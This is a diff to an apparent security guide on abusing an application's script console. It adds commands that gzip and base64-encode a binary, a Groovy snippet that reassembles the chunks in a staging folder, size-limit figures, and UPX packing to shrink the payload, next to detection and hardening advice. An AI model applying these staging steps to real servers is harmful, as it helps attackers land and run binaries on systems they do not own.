@@ -63,7 +63,19 @@ A script console does not only read; it writes. An attacker who cannot use an
 upload form can still move bytes through the text box by encoding them.
 base64+gzip is a common transport: compress and base64 on one side, decode and
 decompress inside a short script on the other. Shown here writing and verifying
-a file so you can see the shape of it; no execution is performed.
+a file so you can see the shape of it; no execution is performed (running a
+landed binary and chaining it to SYSTEM is the app-admin-to-system-chain post).
+
+Encode on your side:
+
+```bash
+gzip -c helper.bin | base64 -w0 > blob.b64          # Linux
+```
+```powershell
+$b=[IO.File]::ReadAllBytes("helper.bin");$ms=New-Object IO.MemoryStream;$gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Compress);$gz.Write($b,0,$b.Length);$gz.Close();[Convert]::ToBase64String($ms.ToArray())|Set-Content -NoNewline blob.b64
+```
+
+Decode inside the console:
 
 ```groovy
 // b64 = a gzip-compressed, base64-encoded payload pasted as text
@@ -82,11 +94,32 @@ to the service account, not just script evaluation. That is why the hardening
 below restricts who can reach it and what the account can touch, and why the
 detection below watches for file creation by the service account.
 
-Short note on transfer: console input has size limits, so moving anything large
-is split across several writes and reassembled. You will see repeated writes,
-not one. Detection does not care about the encoding (base64, gzip, or any
-other): the signal is a new file appearing under the service account,
-especially an executable or a file in a temp directory.
+Size limits and chunking: the console input is a POST form field capped by the
+servlet container (roughly 2 MB on a default bundle). base64 inflates by ~1/3,
+so about 1.4 MB of compressed payload fits in one paste. For more, append the
+base64 across several runs and decode the reassembled file at the end:
+
+```groovy
+new File("C:/ProgramData/stage/blob.b64") << "<next slice of base64>"   // once per chunk
+// final run: new File(...).text.decodeBase64() -> GZIPInputStream -> write + verify
+```
+
+Shrink the binary first with UPX (the public executable packer, whose purpose is
+size) so fewer chunks are needed:
+
+```bash
+upx --best --lzma helper.bin      # often 50-70% smaller for a native PE/ELF
+```
+
+A UPX-packed file is already compressed, so a further gzip gains little: pick one
+(UPX usually beats gzip on a native .exe; gzip alone is simpler for scripts).
+Confirm the packed binary still runs in a lab before relying on it.
+
+Detection does not care about the encoding: the signal is a new file under the
+service account, especially an executable or a temp-dir file, and the
+chunk-reassembly shows up as repeated small writes growing one file. Durable
+control: application control (WDAC/AppLocker, a `noexec` mount) so a landed
+binary cannot execute, plus a service account that can only write where needed.
 
 ## Remote connectivity and egress
 
